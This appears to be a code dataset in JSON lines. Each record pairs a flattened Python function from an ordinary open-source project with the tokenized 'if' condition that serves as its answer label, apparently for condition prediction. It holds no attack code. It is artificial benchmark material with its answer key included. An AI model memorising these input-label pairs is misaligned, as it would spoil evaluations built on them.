{"input": "def test_source_address(self): for addr, is_ipv6 in VALID_SOURCE_ADDRESSES: if is_ipv6 and not HAS_IPV6_AND_DNS: warnings.warn(\"No IPv6 support: skipping.\", NoIPv6Warning) continue with HTTPConnectionPool( self.host, self.port, source_address=addr, retries=False ) as pool: r = pool.request(\"GET\", \"/source_address\") assert r.data == b(addr[0])", "label": "if is_ipv6 and not HAS_IPV6_AND_DNS :"}
{"input": "def _run_commands(self, tool, commands, dry_run=False): if dry_run: self._dry_run_commands(tool, commands) return for command in commands: try: with original_ld_library_path(): self.subprocess_utils.run(command, capture_output=True, check=True) except OSError as ex: if ex.errno == errno.ENOENT: raise ValueError(self._TOOL_NOT_FOUND_MESSAGE % tool) raise ex self._write_success_message(tool)", "label": "if ex . errno == errno . ENOENT :"}
{"input": "def test_float_overflow(self): import sys big_int = int(sys.float_info.max) * 2 for t in float_types + [c_longdouble]: self.assertRaises(OverflowError, t, big_int) if hasattr(t, \"__ctype_be__\"): self.assertRaises(OverflowError, t.__ctype_be__, big_int) if hasattr(t, \"__ctype_le__\"): self.assertRaises(OverflowError, t.__ctype_le__, big_int)", "label": "if hasattr ( t , \"__ctype_be__\" ) :"}
{"input": "def init_weights(self): for n, p in self.named_parameters(): if \"bias\" in n: torch.nn.init.zeros_(p) elif \"fc\" in n: torch.nn.init.xavier_uniform_(p)", "label": "if \"bias\" in n :"}
{"input": "def _compute_dependencies(self): \"\"\"Gather the lists of dependencies and adds to all_parts.\"\"\" for part in self.all_parts: dep_names = self.after_requests.get(part.name, []) for dep_name in dep_names: dep = self.get_part(dep_name) if not dep: raise errors.SnapcraftAfterPartMissingError(part.name, dep_name) part.deps.append(dep)", "label": "if not dep :"}
{"input": "def _delete_object(step): try: api = kubernetes.client.CustomObjectsApi() api.delete_namespaced_custom_object( group=\"zalando.org\", version=\"v1\", plural=\"kopfexamples\", namespace=\"default\", name=f\"kopf-example-{step}\", body={}, ) except kubernetes.client.rest.ApiException as e: if e.status in [404]: pass else: raise", "label": "if e . status in [ 404 ] :"}
{"input": "def _lookup(self, key, dicts=None, filters=()): if dicts is None: dicts = self.dicts key_len = len(key) if key_len > self.longest_key: return None for d in dicts: if not d.enabled: continue if key_len > d.longest_key: continue value = d.get(key) if value: for f in filters: if f(key, value): return None return value", "label": "if key_len > d . longest_key :"}
{"input": "def fork_with_monitor(receiver: Receiver, func, *args, **kwargs): current_actor = self() send(ForkWithMonitor(current_actor, func, args, kwargs), receiver) while True: message = recv(current_actor) if isinstance(message, ForkResponse): return message.new_actor else: send(message, current_actor) return", "label": "if isinstance ( message , ForkResponse ) :"}
{"input": "def read(self, size=-1): if self._offset or (size > -1): # return empty string to indicate EOF if we are offset past the end of the file # else boto will throw an error at us if self._offset >= self._key.size: return \"\" if size > -1: sizeStr = str(self._offset + size - 1) # range header is inclusive else: sizeStr = \"\" hdrs = {\"Range\": \"bytes=%d-%s\" % (self._offset, sizeStr)} else: hdrs = {} buf = self._key.get_contents_as_string(headers=hdrs) self._offset += len(buf) return buf", "label": "if size > - 1 :"}
{"input": "def operations(self): # Search for operations registered_operations = {} for fn in hooks.get_hooks(\"register_image_operations\"): registered_operations.update(dict(fn())) # Build list of operation objects operations = [] for op_spec in self.spec.split(\"|\"): op_spec_parts = op_spec.split(\"-\") if op_spec_parts[0] not in registered_operations: raise InvalidFilterSpecError( \"Unrecognised operation: %s\" % op_spec_parts[0] ) op_class = registered_operations[op_spec_parts[0]] operations.append(op_class(*op_spec_parts)) return operations", "label": "if op_spec_parts [ 0 ] not in registered_operations :"}
{"input": "def find_widget(self, pos): for widget in self.subwidgets[::-1]: if widget.visible: r = widget.rect if r.collidepoint(pos): return widget.find_widget(subtract(pos, r.topleft)) return self", "label": "if widget . visible :"}
{"input": "def _get_body(self): if self._bodytree is None: bodytxt = self._message.accumulate_body() if bodytxt: att = settings.get_theming_attribute(\"thread\", \"body\") att_focus = settings.get_theming_attribute(\"thread\", \"body_focus\") self._bodytree = TextlinesList(bodytxt, att, att_focus) return self._bodytree", "label": "if bodytxt :"}
{"input": "def config_mode(self, config_command=\"conf t\", pattern=\"\"): output = \"\" if not self.check_config_mode(): output = self.send_command_timing( config_command, strip_command=False, strip_prompt=False ) if \"to enter configuration mode anyway\" in output: output += self.send_command_timing( \"YES\", strip_command=False, strip_prompt=False ) if not self.check_config_mode(): raise ValueError(\"Failed to enter configuration mode\") return output", "label": "if not self . check_config_mode ( ) :"}
{"input": "def is_enabled(self): try: cmd = subprocess.Popen( \"netsh advfirewall show currentprofile\", stdout=subprocess.PIPE ) out = cmd.stdout.readlines() for l in out: if l.startswith(\"State\"): state = l.split()[-1].strip() return state == \"ON\" except: return None", "label": "if l . startswith ( \"State\" ) :"}
{"input": "def __rpc_devices(self, *args): data_to_send = {} for device in self.__connected_devices: if self.__connected_devices[device][\"connector\"] is not None: data_to_send[device] = self.__connected_devices[device][ \"connector\" ].get_name() return {\"code\": 200, \"resp\": data_to_send}", "label": "if self . __connected_devices [ device ] [ \"connector\" ] is not None :"}
{"input": "def _mock_manager_nfx(self, *args, **kwargs): if args: if args[0].tag == \"command\": raise RpcError() elif args[0].tag == \"get-software-information\" and args[0].find(\"./*\") is None: return True else: return self._read_file(\"sw_info_nfx_\" + args[0].tag + \".xml\")", "label": "if args [ 0 ] . tag == \"command\" :"}
{"input": "def empty_logs(self, logs=None): if self.quick_log: self.quick_log = [] else: if is_main_thread(): self.logs = [] else: if logs and self.thread_logs.get(current_thread_id()): del self.thread_logs[current_thread_id()]", "label": "if logs and self . thread_logs . get ( current_thread_id ( ) ) :"}
{"input": "def read_cb(dir_path): df_dict = dict() for fold in [\"train\", \"val\", \"test\"]: columns = [\"premise\", \"hypothesis\"] if fold != \"test\": columns.append(\"label\") jsonl_path = os.path.join(dir_path, \"{}.jsonl\".format(fold)) df = read_jsonl_superglue(jsonl_path) df = df[columns] df_dict[fold] = df return df_dict, None", "label": "if fold != \"test\" :"}
{"input": "def _forward_main_responses(self): while self._should_keep_going(): line = self._proc.stdout.readline() if self._main_backend_is_fresh and self._looks_like_echo(line): # In the beginning the backend may echo commands sent to it (perhaps this echo-avoiding trick # takes time). Don't forward those lines. continue if not line: break with self._response_lock: sys.stdout.write(line) sys.stdout.flush() self._main_backend_is_fresh = False", "label": "if self . _main_backend_is_fresh and self . _looks_like_echo ( line ) :"}
{"input": "def _update_server_version(self): \"\"\"Decode the Transmission version string, if available.\"\"\" if self.server_version is None: version_major = 1 version_minor = 30 version_changeset = 0 version_parser = re.compile(\"(\\d).(\\d+) \\((\\d+)\\)\") if hasattr(self.session, \"version\"): match = version_parser.match(self.session.version) if match: version_major = int(match.group(1)) version_minor = int(match.group(2)) version_changeset = match.group(3) self.server_version = (version_major, version_minor, version_changeset)", "label": "if match :"}
{"input": "def _check_type(T, allowed): if T not in allowed: if len(allowed) == 1: allowed.add(T) else: types = \", \".join([t.__name__ for t in allowed] + [T.__name__]) raise TypeError(\"unsupported mixed types: %s\" % types)", "label": "if len ( allowed ) == 1 :"}
{"input": "def split_named_range(range_string): \"\"\"Separate a named range into its component parts\"\"\" for range_string in SPLIT_NAMED_RANGE_RE.split(range_string)[ 1::2 ]: # Skip first and from there every second item match = NAMED_RANGE_RE.match(range_string) if match is None: raise NamedRangeException('Invalid named range string: \"%s\"' % range_string) else: match = match.groupdict() sheet_name = match[\"quoted\"] or match[\"notquoted\"] xlrange = match[\"range\"] sheet_name = sheet_name.replace(\"''\", \"'\") # Unescape ' yield sheet_name, xlrange", "label": "if match is None :"}
{"input": "def clean(self): to_del = [] for i, file_ in enumerate(self.files): try: os.remove(file_) to_del.append(i) except Exception: if not os.path.isfile(file_): to_del.append(i) for i in to_del[::-1]: del self.files[i]", "label": "if not os . path . isfile ( file_ ) :"}
{"input": "def lazy_init(self): f = open(self.filename) self.base = {} while 1: l = f.readline() if not l: break l = l.strip().split(\",\") if len(l) != 3: continue c, lat, long = l self.base[c] = (float(long), float(lat)) f.close()", "label": "if not l :"}
{"input": "def onto_evo_target(self): if self._onto_evo_target is None: self._get_onto_evo_target() if self._onto_evo_target_qobj is None: if isinstance(self._onto_evo_target, Qobj): self._onto_evo_target_qobj = self._onto_evo_target else: rev_dims = [self.sys_dims[1], self.sys_dims[0]] self._onto_evo_target_qobj = Qobj(self._onto_evo_target, dims=rev_dims) return self._onto_evo_target_qobj", "label": "if isinstance ( self . _onto_evo_target , Qobj ) :"}
{"input": "def _dnsname_to_pat(dn): pats = [] for frag in dn.split(r\".\"): if frag == \"*\": # When '*' is a fragment by itself, it matches a non-empty dotless # fragment. pats.append(\"[^.]+\") else: # Otherwise, '*' matches any dotless fragment. frag = re.escape(frag) pats.append(frag.replace(r\"\\*\", \"[^.]*\")) return re.compile(r\"\\A\" + r\"\\.\".join(pats) + r\"\\Z\", re.IGNORECASE)", "label": "if frag == \"*\" :"}
{"input": "def update(id): \"\"\"Update a post if the current user is the author.\"\"\" post = get_post(id) if request.method == \"POST\": title = request.form[\"title\"] body = request.form[\"body\"] error = None if not title: error = \"Title is required.\" if error is not None: flash(error) else: post.title = title post.body = body db.session.commit() return redirect(url_for(\"blog.index\")) return render_template(\"blog/update.html\", post=post)", "label": "if not title :"}
{"input": "def __iter__(self): for token in base.Filter.__iter__(self): if token[\"type\"] in (\"StartTag\", \"EmptyTag\"): attrs = OrderedDict() for name, value in sorted(token[\"data\"].items(), key=_attr_key): attrs[name] = value token[\"data\"] = attrs yield token", "label": "if token [ \"type\" ] in ( \"StartTag\" , \"EmptyTag\" ) :"}
{"input": "def get_polymorphic_model(data): for model in itervalues(models): polymorphic = model.opts.polymorphic if polymorphic: polymorphic_key = polymorphic if isinstance(polymorphic_key, bool): polymorphic_key = \"type\" if data.get(polymorphic_key) == model.__name__: return model raise ImproperlyConfigured(u\"No model found for data: {!r}\".format(data))", "label": "if data . get ( polymorphic_key ) == model . __name__ :"}
{"input": "def _setup_tag(self, tag): # keeping mutual refs tag.py_obj = self self.riot_tag = tag # making the event system call self's methods: handlers = {} for ev in lifecycle_ev: f = getattr(self, ev.replace(\"-\", \"_\")) if f: # this.on('mount', function() {...}): # whats nicer? tag.on(ev, f)", "label": "if f :"}
{"input": "def selection_only(self): selection_only = False sel = self.sel() if (self.context == \"selection\" or self.context == \"both\") and len(sel): # if multiple lines, always true if len(sel) > 1: selection_only = True # check threshold elif self.threshold and not sel[0].empty(): text = self.view.substr(sel[0]) match = re.search(self.threshold, text) if match: selection_only = True # no valid selection else: selection_only = False return selection_only", "label": "if len ( sel ) > 1 :"}
{"input": "def find_torrents_to_fetch(torrent_ids): to_fetch = [] t = time() for torrent_id in torrent_ids: torrent = self.torrents[torrent_id] if t - torrent[0] > self.cache_time: to_fetch.append(torrent_id) else: # We need to check if a key is expired for key in keys: if t - self.cache_times[torrent_id].get(key, 0.0) > self.cache_time: to_fetch.append(torrent_id) break return to_fetch", "label": "if t - torrent [ 0 ] > self . cache_time :"}
{"input": "def filter(callbackfn): array = this.to_object() arr_len = array.get(\"length\").to_uint32() if not callbackfn.is_callable(): raise this.MakeError(\"TypeError\", \"callbackfn must be a function\") T = arguments[1] res = [] k = 0 while k < arr_len: if array.has_property(str(k)): kValue = array.get(str(k)) if callbackfn.call(T, (kValue, this.Js(k), array)).to_boolean().value: res.append(kValue) k += 1 return res # converted to js array automatically", "label": "if callbackfn . call ( T , ( kValue , this . Js ( k ) , array ) ) . to_boolean ( ) . value :"}
{"input": "def generate_py_upgrades(data): \"\"\"Generate the list of upgrades in upgrades.py.\"\"\" print(\" upgrades.py \".center(60, \"-\")) print(\"class Upgrades(enum.IntEnum):\") print(' \"\"\"The list of upgrades, as returned from RequestData.\"\"\"') for upgrade in sorted(data.upgrades, key=lambda a: a.name): if upgrade.name and upgrade.upgrade_id in static_data.UPGRADES: print(\" %s = %s\" % (upgrade.name, upgrade.upgrade_id)) print(\"\\n\")", "label": "if upgrade . name and upgrade . upgrade_id in static_data . UPGRADES :"}
{"input": "def get_first_n(l, n, reverse=False): cur_n = 0 res = [] for si in reversed(l) if reverse else l: if trade_exchange.is_stock_tradable(stock_id=si, trade_date=trade_date): res.append(si) cur_n += 1 if cur_n >= n: break return res[::-1] if reverse else res", "label": "if cur_n >= n :"}
{"input": "def _fill_cache(self): for task in linux_pslist.linux_pslist(self._config).calculate(): for filp, fd in task.lsof(): filepath = linux_common.get_path(task, filp) if type(filepath) == str and filepath.find(\"socket:[\") != -1: to_add = filp.dentry.d_inode.i_ino.v() self.fd_cache[to_add] = [task, filp, fd, filepath]", "label": "if type ( filepath ) == str and filepath . find ( \"socket:[\" ) != - 1 :"}
{"input": "def is_ArAX_implicit(ii): # allows one implicit fixed reg a, implicit_fixed = 0, 0 for op in _gen_opnds(ii): if op_luf_start(op, \"ArAX\"): a += 1 elif op_reg(op) and op_implicit_specific_reg(op): implicit_fixed += 1 else: return False return a == 1 and implicit_fixed <= 1", "label": "elif op_reg ( op ) and op_implicit_specific_reg ( op ) :"}
{"input": "def auto_resize(self, name: str) -> None: \"\"\"recompute widget width based on max length of all of the values\"\"\" widget = self.find_widget(name) for column in range(len(widget._columns) - 1): sizes = [len(x[0][column]) + 1 for x in widget.options] if widget._titles: sizes.append(len(widget._titles[column]) + 1) widget._columns[column] = max(sizes)", "label": "if widget . _titles :"}
{"input": "def dns_set_secondary_nameserver(): from dns_update import set_secondary_dns try: return set_secondary_dns( [ ns.strip() for ns in re.split(r\"[, ]+\", request.form.get(\"hostnames\") or \"\") if ns.strip() != \"\" ], env, ) except ValueError as e: return (str(e), 400)", "label": "if ns . strip ( ) != \"\""}
{"input": "def assert_inputs(inputs, can_be_used=True): # Until we make the dataset private, _different_user() can use it: with self._different_user_and_history() as other_history_id: response = self._run(\"cat1\", other_history_id, inputs) if can_be_used: assert response.status_code == 200 else: self._assert_dataset_permission_denied_response(response)", "label": "if can_be_used :"}
{"input": "def _handle_start(self, tag, attrib): if \"translatable\" in attrib: if attrib[attrib.index(\"translatable\") + 1] == \"yes\": self._translate = True if \"comments\" in attrib: self._comments.append(attrib[attrib.index(\"comments\") + 1])", "label": "if attrib [ attrib . index ( \"translatable\" ) + 1 ] == \"yes\" :"}
{"input": "def get_command(cls): ifconfig_cmd = \"ip\" for path in [\"/sbin\", \"/usr/sbin\", \"/bin\", \"/usr/bin\"]: if os.path.exists(os.path.join(path, ifconfig_cmd)): ifconfig_cmd = os.path.join(path, ifconfig_cmd) break ifconfig_cmd = ifconfig_cmd + \" address show\" return ifconfig_cmd", "label": "ifconfig_cmd = os . path . join ( path , ifconfig_cmd )"}
{"input": "def render(self): \"\"\"What to show when printed.\"\"\" viz = \"\" for y in range(self.grid.height): for x in range(self.grid.width): c = self.grid[y][x] if c is None: viz += \" \" else: viz += self.converter(c) viz += \"\\n\" return viz", "label": "if c is None :"}
{"input": "def _sorted_layers(self, structure, top_layer_id): \"\"\"Return the image layers sorted\"\"\" sorted_layers = [] next_layer = top_layer_id while next_layer: sorted_layers.append(next_layer) if \"json\" not in structure[\"repolayers\"][next_layer]: # v2 break if \"parent\" not in structure[\"repolayers\"][next_layer][\"json\"]: break next_layer = structure[\"repolayers\"][next_layer][\"json\"][\"parent\"] if not next_layer: break return sorted_layers", "label": "if \"json\" not in structure [ \"repolayers\" ] [ next_layer ] :"}
{"input": "def check_sync(self): login_failures = get_login_failures(datetime.now(), catmsgs()) if login_failures: return Alert( SSHLoginFailuresAlertClass, { \"count\": len(login_failures), \"failures\": \"\".join( login_failures if len(login_failures) <= 5 else login_failures[:2] + [f\"... {len(login_failures) - 4} more ...\\n\"] + login_failures[-2:] ), }, )", "label": "if len ( login_failures ) <= 5"}
{"input": "def on_user_auth_login_success(sender, user, request, **kwargs): if settings.USER_LOGIN_SINGLE_MACHINE_ENABLED: user_id = \"single_machine_login_\" + str(user.id) session_key = cache.get(user_id) if session_key and session_key != request.session.session_key: session = import_module(settings.SESSION_ENGINE).SessionStore(session_key) session.delete() cache.set(user_id, request.session.session_key, None)", "label": "if session_key and session_key != request . session . session_key :"}
{"input": "def slots_for_entities(self, entities): if self.store_entities_as_slots: slot_events = [] for s in self.slots: if s.auto_fill: matching_entities = [ e[\"value\"] for e in entities if e[\"entity\"] == s.name ] if matching_entities: if s.type_name == \"list\": slot_events.append(SlotSet(s.name, matching_entities)) else: slot_events.append(SlotSet(s.name, matching_entities[-1])) return slot_events else: return []", "label": "if s . auto_fill :"}
{"input": "def get(self, id): obj = self.klass.objects.get(id=id) if hasattr(obj, \"sharing\"): if group_user_permission(obj): return render_template( \"{}/single.html\".format(self.klass.__name__.lower()), obj=obj ) abort(403) else: return render_template( \"{}/single.html\".format(self.klass.__name__.lower()), obj=obj ) return request.referrer", "label": "if group_user_permission ( obj ) :"}
{"input": "def __call__(self, module, *x): \"\"\"Grab the instantiated layer and evaluate it.\"\"\" operation = getattr(module, self.name) try: if self.func: return self.func(operation, *x) return operation(*x) except: logger.error(\"Failed to apply layer: %s\", self.name) for i, X in enumerate(x): logger.error(\" Input shape #%d: %s\", i + 1, list(X.size())) raise", "label": "if self . func :"}
{"input": "def req(s, poll, msg, expect): do_req = True xid = None while True: # get transaction id if do_req: xid = s.put(msg)[\"xid\"] # wait for response events = poll.poll(2) for (fd, event) in events: response = s.get() if response[\"xid\"] != xid: do_req = False continue if response[\"options\"][\"message_type\"] != expect: raise Exception(\"DHCP protocol error\") return response do_req = True", "label": "if do_req :"}
{"input": "def _state_old_c_params(self, token): self._saved_tokens.append(token) if token == \";\": self._saved_tokens = [] self._state = self._state_dec_to_imp elif token == \"{\": if len(self._saved_tokens) == 2: self._saved_tokens = [] self._state_dec_to_imp(token) return self._state = self._state_global for tkn in self._saved_tokens: self._state(tkn) elif token == \"(\": self._state = self._state_global for tkn in self._saved_tokens: self._state(tkn)", "label": "if len ( self . _saved_tokens ) == 2 :"}
{"input": "def assert_tensors_equal(sess, t1, t2, n): \"\"\"Compute tensors `n` times and ensure that they are equal.\"\"\" for _ in range(n): v1, v2 = sess.run([t1, t2]) if v1.shape != v2.shape: return False if not np.all(v1 == v2): return False return True", "label": "if not np . all ( v1 == v2 ) :"}
{"input": "def http_error_302(self, url, fp, errcode, errmsg, headers, data=None): \"\"\"Error 302 -- relocated (temporarily).\"\"\" self.tries += 1 if self.maxtries and self.tries >= self.maxtries: if hasattr(self, \"http_error_500\"): meth = self.http_error_500 else: meth = self.http_error_default self.tries = 0 return meth(url, fp, 500, \"Internal Server Error: Redirect Recursion\", headers) result = self.redirect_internal(url, fp, errcode, errmsg, headers, data) self.tries = 0 return result", "label": "if hasattr ( self , \"http_error_500\" ) :"}
{"input": "def get_satellite_list(self, daemon_type=\"\"): res = {} for t in [\"arbiter\", \"scheduler\", \"poller\", \"reactionner\", \"receiver\", \"broker\"]: if daemon_type and daemon_type != t: continue satellite_list = [] res[t] = satellite_list daemon_name_attr = t + \"_name\" daemons = self.app.get_daemons(t) for dae in daemons: if hasattr(dae, daemon_name_attr): satellite_list.append(getattr(dae, daemon_name_attr)) return res", "label": "if hasattr ( dae , daemon_name_attr ) :"}
{"input": "def check(data_dir, decrypter, read_only=False): fname = os.path.join(data_dir, DIGEST_NAME) if os.path.exists(fname): if decrypter is None: return False f = open(fname, \"rb\") s = f.read() f.close() return decrypter.decrypt(s) == MAGIC_STRING else: if decrypter is not None: if read_only: return False else: s = decrypter.encrypt(MAGIC_STRING) f = open(fname, \"wb\") f.write(s) f.close() return True", "label": "if decrypter is None :"}
{"input": "def logic(): while 1: yield clock.posedge, reset.negedge if reset == ACTIVE_LOW: count.next = 0 else: if enable: count.next = f1(n)", "label": "if reset == ACTIVE_LOW :"}
{"input": "def get_project_translation(request, project=None, component=None, lang=None): \"\"\"Return project, component, translation tuple for given parameters.\"\"\" if lang and component: # Language defined? We can get all translation = get_translation(request, project, component, lang) component = translation.component project = component.project else: translation = None if component: # Component defined? component = get_component(request, project, component) project = component.project elif project: # Only project defined? project = get_project(request, project) # Return tuple return project or None, component or None, translation or None", "label": "elif project :"}
{"input": "def run(self, sql, encoding=None): stream = lexer.tokenize(sql, encoding) # Process token stream for filter_ in self.preprocess: stream = filter_.process(stream) stream = StatementSplitter().process(stream) # Output: Stream processed Statements for stmt in stream: if self._grouping: stmt = grouping.group(stmt) for filter_ in self.stmtprocess: filter_.process(stmt) for filter_ in self.postprocess: stmt = filter_.process(stmt) yield stmt", "label": "if self . _grouping :"}
{"input": "def get_word_parens_range(self, offset, opening=\"(\", closing=\")\"): end = self._find_word_end(offset) start_parens = self.code.index(opening, end) index = start_parens open_count = 0 while index < len(self.code): if self.code[index] == opening: open_count += 1 if self.code[index] == closing: open_count -= 1 if open_count == 0: return (start_parens, index + 1) index += 1 return (start_parens, index)", "label": "if self . code [ index ] == closing :"}
{"input": "def _get_inherited_env_vars(self): env_vars = os.environ.copy() for var_name in ENV_VARS_BLACKLIST: if var_name.lower() in env_vars: del env_vars[var_name.lower()] if var_name.upper() in env_vars: del env_vars[var_name.upper()] return env_vars", "label": "if var_name . upper ( ) in env_vars :"}
{"input": "def adapt_datetimefield_value(self, value): if value is None: return None # Expression values are adapted by the database. if hasattr(value, \"resolve_expression\"): return value # SQLite doesn't support tz-aware datetimes if timezone.is_aware(value): if settings.USE_TZ: value = timezone.make_naive(value, self.connection.timezone) else: raise ValueError( \"SQLite backend does not support timezone-aware datetimes when USE_TZ is False.\" ) return six.text_type(value)", "label": "if settings . USE_TZ :"}
{"input": "def dragMoveEvent(self, event): data = event.mimeData() urls = data.urls() if urls and urls[0].scheme() == \"file\": event.acceptProposedAction() indexRow = self.indexAt(event.pos()).row() window = self.parent().parent().parent().parent().parent().parent() if indexRow == -1 or not window.clearedPlaylistNote: indexRow = window.playlist.count() window.setPlaylistInsertPosition(indexRow) else: super(MainWindow.PlaylistWidget, self).dragMoveEvent(event)", "label": "if indexRow == - 1 or not window . clearedPlaylistNote :"}
{"input": "def explode(self, obj): \"\"\"Determine if the object should be exploded.\"\"\" if obj in self._done: return False result = False for item in self._explode: if hasattr(item, \"_moId\"): # If it has a _moId it is an instance if obj._moId == item._moId: result = True else: # If it does not have a _moId it is a template if obj.__class__.__name__ == item.__name__: result = True if result: self._done.add(obj) return result", "label": "if obj . __class__ . __name__ == item . __name__ :"}
{"input": "def _maybe_clean(self): \"\"\"Clean the cache if it's time to do so.\"\"\" now = time.time() if self.next_cleaning <= now: keys_to_delete = [] for (k, v) in self.data.items(): if v.expiration <= now: keys_to_delete.append(k) for k in keys_to_delete: del self.data[k] now = time.time() self.next_cleaning = now + self.cleaning_interval", "label": "if v . expiration <= now :"}
{"input": "def test_doc_attributes(self): print_test_name(\"TEST DOC ATTRIBUTES\") correct = 0 for example in DOC_EXAMPLES: original_schema = schema.parse(example.schema_string) if original_schema.doc is not None: correct += 1 if original_schema.type == \"record\": for f in original_schema.fields: if f.doc is None: self.fail( \"Failed to preserve 'doc' in fields: \" + example.schema_string ) self.assertEqual(correct, len(DOC_EXAMPLES))", "label": "if original_schema . type == \"record\" :"}
{"input": "def save_as(self): \"\"\"Save *as* the currently edited file\"\"\" editorstack = self.get_current_editorstack() if editorstack.save_as(): fname = editorstack.get_current_filename() if CONF.get(\"workingdir\", \"editor/save/auto_set_to_basedir\"): self.emit(SIGNAL(\"open_dir(QString)\"), osp.dirname(fname)) self.__add_recent_file(fname)", "label": "if CONF . get ( \"workingdir\" , \"editor/save/auto_set_to_basedir\" ) :"}
{"input": "def verify_settings(rst_path: Path) -> Iterator[Error]: for setting_name, default in find_settings_in_rst(rst_path): actual = getattr(app.conf, setting_name) if isinstance(default, timedelta): default = default.total_seconds() if isinstance(actual, Enum): actual = actual.value if actual != default: yield Error( reason=\"mismatch\", setting=setting_name, default=default, actual=actual, )", "label": "if actual != default :"}
{"input": "def JobWait(self, waiter): # type: (Waiter) -> wait_status_t # wait builtin can be interrupted while True: # Don't retry result = waiter.WaitForOne(False) if result > 0: # signal return wait_status.Cancelled(result) if result == -1: # nothing to wait for break if self.state != job_state_e.Running: break return wait_status.Proc(self.status)", "label": "if self . state != job_state_e . Running :"}
{"input": "def object_hook(obj): obj_len = len(obj) if obj_len == 1: if \"$date\" in obj: return datetime.fromtimestamp( obj[\"$date\"] / 1000, tz=timezone.utc ) + timedelta(milliseconds=obj[\"$date\"] % 1000) if \"$time\" in obj: return time(*[int(i) for i in obj[\"$time\"].split(\":\")]) if obj_len == 2 and \"$type\" in obj and \"$value\" in obj: if obj[\"$type\"] == \"date\": return date(*[int(i) for i in obj[\"$value\"].split(\"-\")]) return obj", "label": "if \"$time\" in obj :"}
{"input": "def before_FunctionDef(self, node): s = self.format(node, print_body=False) if self.test_kind is \"test\": print(s) self.indent += 1 self.context_stack.append(node) if self.pass_n == 1: self.stats.defs += 1 if self.class_name not in self.special_class_names: if self.class_name in self.classes: the_class = self.classes.get(self.class_name) methods = the_class.get(\"methods\") # tag:setter function-name=stringized-args methods[node.name] = self.format(node.args)", "label": "if self . class_name not in self . special_class_names :"}
{"input": "def setAttributeNS(self, namespaceURI, qualifiedName, value): prefix, localname = _nssplit(qualifiedName) attr = self.getAttributeNodeNS(namespaceURI, localname) if attr is None: attr = Attr(qualifiedName, namespaceURI, localname, prefix) attr.value = value attr.ownerDocument = self.ownerDocument self.setAttributeNode(attr) else: if value != attr.value: attr.value = value if attr.isId: _clear_id_cache(self) if attr.prefix != prefix: attr.prefix = prefix attr.nodeName = qualifiedName", "label": "if attr . isId :"}
{"input": "def main(): try: from wsgiref.simple_server import make_server from wsgiref.validate import validator if port[0] == 0: port[0] = get_open_port() wsgi_application = WsgiApplication(msgpackrpc_application) server = make_server(host, port[0], validator(wsgi_application)) logger.info(\"Starting interop server at %s:%s.\" % (host, port[0])) logger.info(\"WSDL is at: /?wsdl\") server.serve_forever() except ImportError: print(\"Error: example server code requires Python >= 2.5\")", "label": "if port [ 0 ] == 0 :"}
{"input": "def yield_modules(path): \"\"\"Yield all Python modules underneath *path*\"\"\" for (dpath, dnames, fnames) in os.walk(path): module = tuple(dpath.split(\"/\")[1:]) for fname in fnames: if not fname.endswith(\".py\"): continue fpath = os.path.join(dpath, fname) if fname == \"__init__.py\": yield (fpath, module) else: yield (fpath, module + (fname[:-3],)) dnames[:] = [ x for x in dnames if os.path.exists(os.path.join(dpath, x, \"__init__.py\")) ]", "label": "if fname == \"__init__.py\" :"}
{"input": "def dump_section(name, section): lines.append(\"[%s]\\n\" % name) for key, value in section.all_items(): if not key.startswith(\"_\"): try: if key in section.definitions: lines.append( \"%s=%s\\n\" % (key, section.definitions[key].tostring(value)) ) else: lines.append(\"%s=%s\\n\" % (key, value)) except: logger.exception('Error serializing \"%s\" in section \"[%s]\"', key, name) lines.append(\"\\n\")", "label": "if key in section . definitions :"}
{"input": "def testCreateTimeout(self): cluster = None try: env_path = \"conda://\" + os.environ[\"CONDA_PREFIX\"] log_config_file = os.path.join( os.path.dirname(os.path.abspath(__file__)), \"yarn-logging.conf\" ) with self.assertRaises(TimeoutError): cluster = new_cluster( env_path, log_config=log_config_file, worker_cache_mem=\"64m\", log_when_fail=True, timeout=1, ) finally: if cluster is not None: cluster.stop()", "label": "if cluster is not None :"}
{"input": "def read_phrases(data_dir, movies=None): res = {} for parts in iterate_entries(data_dir, \"movie_lines.txt\"): l_id, m_id, l_str = parts[0], parts[2], parts[4] if movies and m_id not in movies: continue tokens = utils.tokenize(l_str) if tokens: res[l_id] = tokens return res", "label": "if tokens :"}
{"input": "def get_Subclass_of(rt): for y in [getattr(Ast, x) for x in dir(Ast)]: yt = clr.GetClrType(y) if rt == yt: continue if yt.IsAbstract: continue if yt.IsSubclassOf(rt): yield yt.Name", "label": "if yt . IsSubclassOf ( rt ) :"}
{"input": "def retrieve(self, aclass): \"\"\"Look for a specifc class/name in the packet\"\"\" resu = [] for x in self.payload: try: if isinstance(aclass, str): if x.name == aclass: resu.append(x) else: if isinstance(x, aclass): resu.append(x) resu += x.retrieve(aclass) except: pass return resu", "label": "if isinstance ( x , aclass ) :"}
{"input": "def _max_physical(self): \"How big is the physical screen?\" # On OS X newwin does not correctly get the size of the screen. # let's see how big we could be: create a temp screen # and see the size curses makes it. No good to keep, though try: mxy, mxx = struct.unpack( \"hh\", fcntl.ioctl(sys.stderr.fileno(), termios.TIOCGWINSZ, \"xxxx\") ) if (mxy, mxx) == (0, 0): raise ValueError except (ValueError, NameError): mxy, mxx = curses.newwin(0, 0).getmaxyx() # return safe values, i.e. slightly smaller. return (mxy - 1, mxx - 1)", "label": "if ( mxy , mxx ) == ( 0 , 0 ) :"}
{"input": "def deserialize(self, cassette_string): cassette_dict = self.base_serializer.deserialize(cassette_string) for interaction in cassette_dict[\"interactions\"]: response = interaction[\"response\"] headers = response[\"headers\"] if \"Content-Range\" in headers and \"Content-Disposition\" in headers: rg, size, filename = self._parse_headers(headers) with open(join(self.directory, filename), \"rb\") as f: f.seek(rg[0]) content = f.read(rg[1] - rg[0] + 1) response[\"body\"][\"string\"] = content return cassette_dict", "label": "if \"Content-Range\" in headers and \"Content-Disposition\" in headers :"}
{"input": "def parse_head(fileobj, parser): \"\"\"Return a list of key, value pairs.\"\"\" while 1: data = fileobj.read(CHUNK) try: parser.feed(data) except EndOfHeadError: break if len(data) != CHUNK: # this should only happen if there is no HTML body, or if # CHUNK is big break return parser.http_equiv", "label": "if len ( data ) != CHUNK :"}
